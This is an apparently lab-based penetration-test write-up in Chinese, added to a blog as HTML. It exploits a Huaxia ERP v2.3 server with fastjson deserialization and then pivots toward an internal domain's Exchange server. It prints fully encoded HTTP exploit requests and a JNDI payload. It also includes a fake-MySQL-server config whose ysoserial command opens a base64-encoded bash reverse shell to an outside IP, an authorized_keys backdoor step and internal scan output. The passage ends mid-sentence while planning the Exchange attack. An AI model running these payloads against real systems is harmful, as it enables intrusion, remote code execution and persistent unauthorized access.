@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/99706997?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="
+# 外网
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# fscan -h 39.99.131.160
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.131.160:22 open
+39.99.131.160:8000 open
+39.99.131.160:80 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://39.99.131.160      code:200 len:19813  title:lumia
+[*] WebTitle http://39.99.131.160:8000 code:302 len:0      title:None 跳转url: http://39.99.131.160:8000/login.html
+[*] WebTitle http://39.99.131.160:8000/login.html code:200 len:5662   title:Lumia ERP
+```
+是个华夏erp v2.3
+[[Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/347135.html)](https://www.freebuf.com/articles/web/347135.html)
+
+开启`checkAutoType`才能打fastjson反序列化，这里靶子开了，这里还是全编码一下吧，不然打不进去
+```text
+GET /user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%67%62%64%6e%67%65%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&currentPage=1&pageSize=15 HTTP/1.1
+Host: 39.99.131.160:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://39.99.131.160:8000/login.html
+Connection: keep-alive
+Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
+Priority: u=0, i
+
+
+```
+
+<img width='1928' height='1073' alt='Image' src='https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40' />
+
+接下来弹shell，发现一直没法接到响应
+
+Fastjson的`JdbcRowSetImpl`利用链最终会触发JNDI的`lookup()`请求，从你的服务器加载并执行恶意类。">
+<meta property="og:title" content="Exchange">
+<meta property="og:description" content="
+# 外网
+
+```bash
+┌──(root㉿MJ)-[/tmp/test]
+└─# fscan -h 39.99.131.160
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   <
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+39.99.131.160:22 open
+39.99.131.160:8000 open
+39.99.131.160:80 open
+[*] alive ports len is: 3
+start vulscan
+[*] WebTitle http://39.99.131.160      code:200 len:19813  title:lumia
+[*] WebTitle http://39.99.131.160:8000 code:302 len:0      title:None 跳转url: http://39.99.131.160:8000/login.html
+[*] WebTitle http://39.99.131.160:8000/login.html code:200 len:5662   title:Lumia ERP
+```
+是个华夏erp v2.3
+[[Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/347135.html)](https://www.freebuf.com/articles/web/347135.html)
+
+开启`checkAutoType`才能打fastjson反序列化，这里靶子开了，这里还是全编码一下吧，不然打不进去
+```text
+GET /user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%67%62%64%6e%67%65%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&currentPage=1&pageSize=15 HTTP/1.1
+Host: 39.99.131.160:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://39.99.131.160:8000/login.html
+Connection: keep-alive
+Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
+Priority: u=0, i
+
+
+```
+
+<img width='1928' height='1073' alt='Image' src='https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40' />
+
+接下来弹shell，发现一直没法接到响应
+
+Fastjson的`JdbcRowSetImpl`利用链最终会触发JNDI的`lookup()`请求，从你的服务器加载并执行恶意类。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://faabbi.github.io/post/Exchange.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
+<title>Exchange</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Exchange</h1>
+<div class="title-right">
+    <a href="https://faabbi.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/faabbi/faabbi.github.io/issues/45" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>外网</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> fscan -h 39.99.131.160</span>
+
+   ___                              _
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">39.99.131.160:22 open</span>
+<span class="pl-s">39.99.131.160:8000 open</span>
+<span class="pl-s">39.99.131.160:80 open</span>
+<span class="pl-s">[*] alive ports len is: 3</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[*] WebTitle http://39.99.131.160      code:200 len:19813  title:lumia</span>
+<span class="pl-s">[*] WebTitle http://39.99.131.160:8000 code:302 len:0      title:None 跳转url: http://39.99.131.160:8000/login.html</span>
+<span class="pl-s">[*] WebTitle http://39.99.131.160:8000/login.html code:200 len:5662   title:Lumia ERP</span></pre></div>
+<p>是个华夏erp v2.3<br>
+[<a href="https://www.freebuf.com/articles/web/347135.html" rel="nofollow">Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户</a>](<a href="https://www.freebuf.com/articles/web/347135.html" rel="nofollow">https://www.freebuf.com/articles/web/347135.html</a>)</p>
+<p>开启<code class="notranslate">checkAutoType</code>才能打fastjson反序列化，这里靶子开了，这里还是全编码一下吧，不然打不进去</p>
+<pre lang="text" class="notranslate"><code class="notranslate">GET /user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%67%62%64%6e%67%65%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&amp;currentPage=1&amp;pageSize=15 HTTP/1.1
+Host: 39.99.131.160:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://39.99.131.160:8000/login.html
+Connection: keep-alive
+Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
+Priority: u=0, i
+
+
+</code></pre>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40"><img width="1928" height="1073" alt="Image" src="https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40" style="max-width: 100%; height: auto; max-height: 1073px;; aspect-ratio: 1928 / 1073; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<p>接下来弹shell，发现一直没法接到响应</p>
+<p>Fastjson的<code class="notranslate">JdbcRowSetImpl</code>利用链最终会触发JNDI的<code class="notranslate">lookup()</code>请求，从你的服务器加载并执行恶意类。但Oracle在JDK中引入了安全限制：</p>
+<ul>
+<li>
+<p><strong>RMI协议</strong>：从 <strong>JDK 8u121</strong> 开始，<code class="notranslate">com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为 <code class="notranslate">false</code>，禁止从远程Codebase加载工厂类。</p>
+</li>
+<li>
+<p><strong>LDAP协议</strong>：从 <strong>JDK 8u191</strong> 开始，<code class="notranslate">com.sun.jndi.ldap.object.trustURLCodebase</code> 也默认变为 <code class="notranslate">false</code>。此外，<strong>JDK 8u432</strong>（OpenJDK）/ <strong>8u461</strong>（OracleJDK）之后的版本，进一步限制了LDAP的本地反序列化利用链<a href="https://www.gm7.org/archives/49610" rel="nofollow"></a>。</p>
+</li>
+</ul>
+<p>你使用的RMI协议（<code class="notranslate">rmi://211.159.175.21:1099/islsln</code>）正好触发了第一个限制，因此DNSlog有记录，但JVM拒绝了远程类的加载。</p>
+<pre class="notranslate"><code class="notranslate">{
+    "a":{
+        "@type":"java.lang.Class",
+        "val":"com.sun.rowset.JdbcRowSetImpl"
+    },
+    "b":{
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://211.159.175.21:1099/pkpdow",
+        "autoCommit":true
+    }
+}
+</code></pre>
+<p>华夏ERP的<code class="notranslate">pom.xml</code>中引入了<code class="notranslate">mysql-connector-java</code>依赖，其内部类<code class="notranslate">com.mysql.jdbc.JDBC4Connection</code>存在反序列化漏洞</p>
+<p>有些博客水的很，高质量的还是得自己找<br>
+[<a href="https://xz.aliyun.com/news/91580" rel="nofollow">华夏erp-v2.3代码审计-先知社区</a>](<a href="https://xz.aliyun.com/news/91580" rel="nofollow">https://xz.aliyun.com/news/91580</a>)<br>
+这里有绕过手法，但是可能checkAutoType并没有开，所以也打不了</p>
+<p>所以走mysql JDBC了，只能说没有ai感觉自己就是煞笔了</p>
+<p>修改一下config.json文件，然后直接打就行了，这里还得测一下链子，报错会有提示，cc6可以用</p>
+<div class="highlight highlight-source-json"><pre class="notranslate"><span class="pl-ii">root@VM-8-5-ubuntu:~/tools/MySQL_Fake_Server# cat config.json</span>
+{
+  <span class="pl-ent">"config"</span>: {
+    <span class="pl-ent">"ysoserialPath"</span>: <span class="pl-s"><span class="pl-pds">"</span>./ysoserial-all.jar<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"javaBinPath"</span>: <span class="pl-s"><span class="pl-pds">"</span>java<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"fileOutputDir"</span>: <span class="pl-s"><span class="pl-pds">"</span>./fileOutput/<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"displayFileContentOnScreen"</span>: <span class="pl-c1">true</span>,
+    <span class="pl-ent">"saveToFile"</span>: <span class="pl-c1">true</span>
+  },
+  <span class="pl-ent">"fileread"</span>: {
+    <span class="pl-ent">"linux_passwd"</span>: <span class="pl-s"><span class="pl-pds">"</span>/etc/passwd<span class="pl-pds">"</span></span>,
+    <span class="pl-ent">"linux_hosts"</span>: <span class="pl-s"><span class="pl-pds">"</span>/etc/hosts<span class="pl-pds">"</span></span>
+  },
+  <span class="pl-ent">"yso"</span>: {
+    <span class="pl-ent">"CommonsCollections6"</span>: [
+      <span class="pl-s"><span class="pl-pds">"</span>CommonsCollections6<span class="pl-pds">"</span></span>,
+      <span class="pl-s"><span class="pl-pds">"</span>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}<span class="pl-pds">"</span></span>
+    ]
+  }
+}</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@VM-8-5-ubuntu:<span class="pl-k">~</span>/tools/MySQL_Fake_Server# python3 server.py
+/root/tools/MySQL_Fake_Server/server.py:17: DeprecationWarning: <span class="pl-s"><span class="pl-pds">"</span>@coroutine<span class="pl-pds">"</span></span> decorator is deprecated since Python 3.8, use <span class="pl-s"><span class="pl-pds">"</span>async def<span class="pl-pds">"</span></span> instead
+  def accept_server(server_reader, server_writer):
+/root/tools/MySQL_Fake_Server/server.py:21: DeprecationWarning: <span class="pl-s"><span class="pl-pds">"</span>@coroutine<span class="pl-pds">"</span></span> decorator is deprecated since Python 3.8, use <span class="pl-s"><span class="pl-pds">"</span>async def<span class="pl-pds">"</span></span> instead
+  def process_fileread(server_reader, server_writer,filename):
+/root/tools/MySQL_Fake_Server/server.py:63: DeprecationWarning: <span class="pl-s"><span class="pl-pds">"</span>@coroutine<span class="pl-pds">"</span></span> decorator is deprecated since Python 3.8, use <span class="pl-s"><span class="pl-pds">"</span>async def<span class="pl-pds">"</span></span> instead
+  def handle_server(server_reader, server_writer):
+===========================================
+MySQL Fake Server
+Author:fnmsd(https://blog.csdn.net/fnmsd)
+Load 2 Fileread usernames :[b<span class="pl-s"><span class="pl-pds">'</span>linux_passwd<span class="pl-pds">'</span></span>, b<span class="pl-s"><span class="pl-pds">'</span>linux_hosts<span class="pl-pds">'</span></span>]
+Load 1 yso usernames :[b<span class="pl-s"><span class="pl-pds">'</span>CommonsCollections6<span class="pl-pds">'</span></span>]
+Load 0 Default Files :[]
+Start Server at port 3306
+Incoming Connection:(<span class="pl-s"><span class="pl-pds">'</span>39.99.131.160<span class="pl-pds">'</span></span>, 56484)
+Login Username:CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Fake MySQL Server Environment Data
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6
+<span class="pl-k">&lt;</span>= 3
+Sending Presetting YSO Data with username CommonsCollections6</pre></div>
+<pre class="notranslate"><code class="notranslate">GET /user/list?search=%7b%0d%0a%20%20%22%6e%61%6d%65%22%3a%20%7b%0d%0a%20%20%20%20%22%40%74%79%70%65%22%3a%20%22%6a%61%76%61%2e%6c%61%6e%67%2e%41%75%74%6f%43%6c%6f%73%65%61%62%6c%65%22%2c%0d%0a%20%20%20%20%22%40%74%79%70%65%22%3a%20%22%63%6f%6d%2e%6d%79%73%71%6c%2e%6a%64%62%63%2e%4a%44%42%43%34%43%6f%6e%6e%65%63%74%69%6f%6e%22%2c%0d%0a%20%20%20%20%22%68%6f%73%74%54%6f%43%6f%6e%6e%65%63%74%54%6f%22%3a%20%22%32%31%31%2e%31%35%39%2e%31%37%35%2e%32%31%22%2c%0d%0a%20%20%20%20%22%70%6f%72%74%54%6f%43%6f%6e%6e%65%63%74%54%6f%22%3a%20%33%33%30%36%2c%0d%0a%20%20%20%20%22%69%6e%66%6f%22%3a%20%7b%0d%0a%20%20%20%20%20%20%22%75%73%65%72%22%3a%20%22%43%6f%6d%6d%6f%6e%73%43%6f%6c%6c%65%63%74%69%6f%6e%73%36%22%2c%0d%0a%20%20%20%20%20%20%22%70%61%73%73%77%6f%72%64%22%3a%20%22%70%61%73%73%22%2c%0d%0a%20%20%20%20%20%20%22%73%74%61%74%65%6d%65%6e%74%49%6e%74%65%72%63%65%70%74%6f%72%73%22%3a%20%22%63%6f%6d%2e%6d%79%73%71%6c%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72%22%2c%0d%0a%20%20%20%20%20%20%22%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%22%3a%20%22%74%72%75%65%22%2c%0d%0a%20%20%20%20%20%20%22%4e%55%4d%5f%48%4f%53%54%53%22%3a%20%22%31%22%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%7d&amp;currentPage=1&amp;pageSize=15 HTTP/1.1
+Host: 39.99.131.160:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://39.99.131.160:8000/login.html
+Connection: keep-alive
+Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
+Upgrade-Insecure-Requests: 1
+If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
+Priority: u=0, i
+
+
+</code></pre>
+<p>直接发包就行</p>
+<p>拿到shell写个公钥，连上就行</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM4qXRwDvTl9ctJFAuhiWRSobyowSJ6tnlykH6JNAa5rw/7X30dRmROBSdxs68lkvXp7y6xgjHtyfhzNZFtOw22xLBk7fIrt++7jF4h3fnIen/PokDThRJFFPi/rBTADsVrfqCcfhSUBCks2rKoMr4SJKjAwZK3znfKEtKQWhOz7o9zipCMoLatte1TWGmL0OY8f7hJxQpCwmKxK2LFI3lA8eS5pzlQ+4lzdNW3TytxRynKV1LUbkGJ7x/aNrood/UphbqxVVrgx/UXlZRPivit5Ya0ilp/d5uEpdBtGT395uCxKTqSDHQfvalbqbIdGZYq8Ilx+jeKMDFzDZVgACb29DIORYjKEzCIpiLALsTB8MdY2kcrkk6rkkf/Fy+vGkdJ0Q9MzvJ/PRbigKtx/zHiUp+j9j/nBBmPMp5FNzBBeMBlH76DJlDcw8cBTZCVYz1HiqdL4YhXvcoZ7yLj7qa0r7MpFwnobcpMc7mlJLqcf2Pltj4RoLxAu6KLD4ZcfU=<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> authorized_keys</pre></div>
+<h1>内网</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@iZ8vbhdtw0jrxiy61cxxupZ:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ss -lnt</span>
+State       Recv-Q Send-Q         Local Address:Port                        Peer Address:Port
+LISTEN      0      128                        <span class="pl-k">*</span>:80                                     <span class="pl-k">*</span>:<span class="pl-k">*</span>
+LISTEN      0      128                        <span class="pl-k">*</span>:22                                     <span class="pl-k">*</span>:<span class="pl-k">*</span>
+LISTEN      0      80                 127.0.0.1:3306                                   <span class="pl-k">*</span>:<span class="pl-k">*</span>
+LISTEN      0      128                       :::80                                    :::<span class="pl-k">*</span>
+LISTEN      0      100                       :::8000                                  :::<span class="pl-k">*</span></pre></div>
+<p>本地开的有mysql，但是扒拉erp的时候发现没什么数据，所以也就没看了，也是还得反编译jar包，太麻烦了</p>
+<p>继续fscan</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@iZ8vbhdtw0jrxiy61cxxupZ:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> fscan -h 172.22.3.12/24</span>
+
+   ___                              _
+  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
+ / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
+<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
+<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
+<span class="pl-s">                     fscan version: 1.8.4</span>
+<span class="pl-s">start infoscan</span>
+<span class="pl-s">(icmp) Target 172.22.3.12     is alive</span>
+<span class="pl-s">(icmp) Target 172.22.3.9      is alive</span>
+<span class="pl-s">(icmp) Target 172.22.3.26     is alive</span>
+<span class="pl-s">(icmp) Target 172.22.3.2      is alive</span>
+<span class="pl-s">[*] Icmp alive hosts len is: 4</span>
+<span class="pl-s">172.22.3.12:8000 open</span>
+<span class="pl-s">172.22.3.9:445 open</span>
+<span class="pl-s">172.22.3.2:445 open</span>
+<span class="pl-s">172.22.3.26:445 open</span>
+<span class="pl-s">172.22.3.26:139 open</span>
+<span class="pl-s">172.22.3.2:139 open</span>
+<span class="pl-s">172.22.3.9:139 open</span>
+<span class="pl-s">172.22.3.9:443 open</span>
+<span class="pl-s">172.22.3.26:135 open</span>
+<span class="pl-s">172.22.3.2:135 open</span>
+<span class="pl-s">172.22.3.9:808 open</span>
+<span class="pl-s">172.22.3.9:135 open</span>
+<span class="pl-s">172.22.3.9:80 open</span>
+<span class="pl-s">172.22.3.9:81 open</span>
+<span class="pl-s">172.22.3.12:80 open</span>
+<span class="pl-s">172.22.3.12:22 open</span>
+<span class="pl-s">172.22.3.2:88 open</span>
+<span class="pl-s">172.22.3.9:8172 open</span>
+<span class="pl-s">[*] alive ports len is: 18</span>
+<span class="pl-s">start vulscan</span>
+<span class="pl-s">[*] NetInfo</span>
+<span class="pl-s">[*]172.22.3.2</span>
+<span class="pl-s">   [-&gt;]XIAORANG-WIN16</span>
+<span class="pl-s">   [-&gt;]172.22.3.2</span>
+<span class="pl-s">[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia</span>
+<span class="pl-s">[*] NetInfo</span>
+<span class="pl-s">[*]172.22.3.9</span>
+<span class="pl-s">   [-&gt;]XIAORANG-EXC01</span>
+<span class="pl-s">   [-&gt;]172.22.3.9</span>
+<span class="pl-s">[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)</span>
+<span class="pl-s">[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC</span>
+<span class="pl-s">[*] NetInfo</span>
+<span class="pl-s">[*]172.22.3.26</span>
+<span class="pl-s">   [-&gt;]XIAORANG-PC</span>
+<span class="pl-s">   [-&gt;]172.22.3.26</span>
+<span class="pl-s">[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393</span>
+<span class="pl-s">[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html</span>
+<span class="pl-s">[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393</span>
+<span class="pl-s">[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span>
+<span class="pl-s">[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。</span>
+<span class="pl-s">[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None</span>
+<span class="pl-s">[*] WebTitle http://172.22.3.9         code:403 len:0      title:None</span>
+<span class="pl-s">[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/</span>
+<span class="pl-s">[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span>
+<span class="pl-s">已完成 18/18</span></pre></div>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th>IP</th>
+<th>主机名</th>
+<th>域/NetBios</th>
+<th>操作系统</th>
+<th>开放端口</th>
+<th>Web/服务</th>
+<th>角色推断</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>172.22.3.2</strong></td>
+<td><code class="notranslate">XIAORANG-WIN16</code></td>
+<td><code class="notranslate">xiaorang.lab</code></td>
+<td>Windows Server 2016 Datacenter 14393</td>
+<td>88, 135, 139, 445</td>
+<td>无 Web</td>
+<td><strong>域控制器（DC）</strong>，Kerberos 88 + SMB 445</td>
+</tr>
+<tr>
+<td><strong>172.22.3.9</strong></td>
+<td><code class="notranslate">XIAORANG-EXC01</code></td>
+<td><code class="notranslate">xiaorang.lab</code></td>
+<td>Windows Server 2016 Datacenter 14393</td>
+<td>80, 81, 135, 139, 443, 445, 808, 8172</td>
+<td>80→403；81→403；443→302 <code class="notranslate">/owa/</code>；OWA 登录页；8172→404</td>
+<td><strong>Exchange 服务器</strong>（OWA 已暴露）</td>
+</tr>
+<tr>
+<td><strong>172.22.3.26</strong></td>
+<td><code class="notranslate">XIAORANG-PC</code></td>
+<td><code class="notranslate">XIAORANG</code></td>
+<td>未明确，NetBios 显示为 PC</td>
+<td>135, 139, 445</td>
+<td>无 Web</td>
+<td><strong>域内工作站</strong></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p>都在域内，打exchange服务 在2016 server上部署的，大概率就是2016，其实也可以nmap扫一下，需要一个存在的邮箱， <a href="mailto:administrator@xiaorang.lab">administrator@xiaorang.lab</a> 大概率存在<br>
